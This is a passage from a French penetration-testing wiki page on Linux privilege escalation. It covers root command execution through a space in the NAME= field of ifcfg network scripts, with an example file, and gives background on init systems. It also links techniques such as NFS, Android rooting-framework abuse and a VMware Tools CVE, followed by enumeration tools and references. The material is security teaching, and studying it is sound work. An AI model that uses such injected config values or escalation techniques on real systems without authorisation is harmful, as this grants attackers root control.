Les scripts réseau, _ifcg-eth0_ par exemple, sont utilisés pour les connexions réseau. Ils ressemblent exactement à des fichiers .INI. Cependant, ils sont \~sourcés\~ sous Linux par Network Manager (dispatcher.d).

Dans mon cas, l’attribut `NAME=` de ces scripts réseau n’est pas traité correctement. Si le nom contient un **espace blanc**, le système tente d’exécuter la partie située après cet espace. Cela signifie que **tout ce qui suit le premier espace est exécuté en tant que root**.

Par exemple : _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Notez l’espace entre Network et /bin/id_)

### **init, init.d, systemd et rc.d**

Le répertoire `/etc/init.d` contient les **scripts** de System V init (SysVinit), le **système classique de gestion des services Linux**. Il inclut des scripts pour `start`, `stop`, `restart` et parfois `reload` des services. Ceux-ci peuvent être exécutés directement ou via les liens symboliques présents dans `/etc/rc?.d/`. Un chemin alternatif sur les systèmes Redhat est `/etc/rc.d/init.d`.

En revanche, `/etc/init` est associé à **Upstart**, un **système de gestion des services** plus récent introduit par Ubuntu, qui utilise des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont toujours utilisés conjointement avec les configurations Upstart grâce à une couche de compatibilité dans Upstart.

**systemd** apparaît comme un gestionnaire moderne d’initialisation et de services, offrant des fonctionnalités avancées telles que le démarrage à la demande des daemons, la gestion de l’automontage et les snapshots de l’état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les packages de distribution et dans `/etc/systemd/system/` pour les modifications des administrateurs, simplifiant ainsi l’administration du système.

## Autres techniques

### Escalade de privilèges NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Évasion des Shells restreints


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Les frameworks de rooting Android hookent généralement un syscall afin d’exposer des fonctionnalités privilégiées du kernel à un manager en espace utilisateur. Une authentification faible du manager (par exemple, des vérifications de signature basées sur l’ordre des FD ou de mauvais schémas de mot de passe) peut permettre à une application locale d’usurper l’identité du manager et d’effectuer une escalade vers root sur des appareils déjà rootés. En savoir plus et consulter les détails de l’exploitation ici :


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Découverte de service VMware Tools LPE (CWE-426) via exec basé sur des regex (CVE-2025-41244)

La découverte de services basée sur des regex dans VMware Tools/Aria Operations peut extraire un chemin de binaire depuis les lignes de commande des processus et l’exécuter avec -v dans un contexte privilégié. Des patterns permissifs (par exemple, utilisant \S) peuvent correspondre à des listeners placés par un attaquant dans des emplacements accessibles en écriture (par exemple, /tmp/httpd), ce qui conduit à une exécution en tant que root (CWE-426 Untrusted Search Path).

En savoir plus et consulter ici un pattern généralisé applicable à d’autres stacks de découverte/monitoring :

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protections de sécurité du Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Plus d’aide

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Outils de Privesc Linux/Unix

### **Meilleur outil pour rechercher les vecteurs d’escalade de privilèges locale sous Linux :** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum** : [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(option -t)\
**Enumy** : [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check :** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker :** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot :** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop :** Énumère les vulnérabilités du kernel sous Linux et MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit :** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester :** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (accès physique) :** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation de scripts supplémentaires** : [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Références

- [0xdf – HTB Planning (Privesc via Crontab UI, réutilisation de credentials avec zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: payload .text_sig forgé pour un monitor exécuté par cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (hijack de sudo env_keep PATH)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (injection arithmétique Bash via les logs, chaîne complète)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (fichier de démarrage non interactif)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + Privesc via lien symbolique TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (copie cron de pg_basebackup → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
